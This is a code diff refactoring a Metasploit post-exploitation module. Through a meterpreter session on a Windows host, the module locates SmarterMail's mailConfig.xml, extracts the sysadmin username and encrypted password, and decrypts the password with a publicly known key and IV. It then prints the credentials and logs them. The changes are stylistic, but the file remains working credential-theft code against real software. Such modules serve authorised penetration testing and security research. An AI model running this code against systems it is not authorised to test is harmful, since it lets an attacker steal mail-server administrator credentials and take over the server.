@@ -1,15 +1,13 @@
-# -*- coding: utf-8 -*-
 ##
 # This module requires Metasploit: http//metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 require 'msf/core'
 require 'msf/core/auxiliary/report'
-require 'rex'
 
 class Metasploit3 < Msf::Post
   include Msf::Auxiliary::Report
-  include Msf::Post::File
 
   def initialize(info = {})
     super(update_info(
@@ -19,12 +17,13 @@ class Metasploit3 < Msf::Post
         This module extracts and decrypts the sysadmin password in the
         SmarterMail 'mailConfig.xml' configuration file. The encryption
         key and IV are publicly known.
+
         This module has been tested successfully on SmarterMail versions
         10.7.4842 and 11.7.5136.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [
-        'Joe Giron @theonlyevil1',            # Discovery and PoC
+        'Joe Giron',                          # Discovery and PoC (@theonlyevil1)
         'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
       ],
       'References'    =>
@@ -34,6 +33,10 @@ class Metasploit3 < Msf::Post
       'Platform'      => ['win'],
       'SessionTypes'  => ['meterpreter']
     ))
+  end
+
+  def peer
+    "#{session.sock.peerhost} (#{sysinfo['Computer']})"
   end
 
   #
@@ -56,12 +59,10 @@ class Metasploit3 < Msf::Post
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
       begin
         path = "#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml"
-        vprint_status "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-          "Checking for SmarterMail config file: #{path}"
+        vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
         return path if client.fs.file.stat(path)
       rescue Rex::Post::Meterpreter::RequestError => e
-        print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-          "Could not load #{path} - #{e}"
+        print_error "#{peer} - Could not load #{path} - #{e}"
         return
       end
     end
@@ -72,18 +73,15 @@ class Metasploit3 < Msf::Post
   #
   def get_smartermail_creds(path)
     result = {}
-    vprint_status "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-      'Retrieving SmarterMail sysadmin password'
+    vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
       data = read_file("#{path}") || ''
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-        "Failed to download #{path} - #{e}"
+      print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
       return
     end
     if data.nil?
-      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-        'Configuration file is empty.'
+      print_error "#{peer} - Configuration file is empty."
       return
     end
     username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
@@ -100,27 +98,26 @@ class Metasploit3 < Msf::Post
     # check for SmartMail config file
     config_path = check_smartermail
     if config_path.nil?
-      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-        'Could not find SmarterMail config file'
+      print_error "#{peer} - Could not find SmarterMail config file"
       return
     end
 
     # retrieve username and decrypted password from config file
     result = get_smartermail_creds(config_path)
     if result['password'].nil?
-      print_error "#{session.sock.peerhost} (#{sysinfo['Computer']}) - " +
-        'Could not decrypt password string'
+      print_error "#{peer} - Could not decrypt password string"
       return
     end
 
     # report result
-    print_good "#{session.sock.peerhost} (#{sysinfo['Computer']}) - Found credentials. " +
-      "Username: '#{result['username']}' Password: '#{result['password']}'"
+    user = result['username']
+    pass = result['password']
+    print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
     report_auth_info(
       :host  => session.sock.peerhost,
       :sname => 'http',
-      :user  => result['username'],
-      :pass  => result['password'],
+      :user  => user,
+      :pass  => pass,
       :source_id   => session.db_record ? session.db_record.id : nil,
       :source_type => 'vuln')
   end
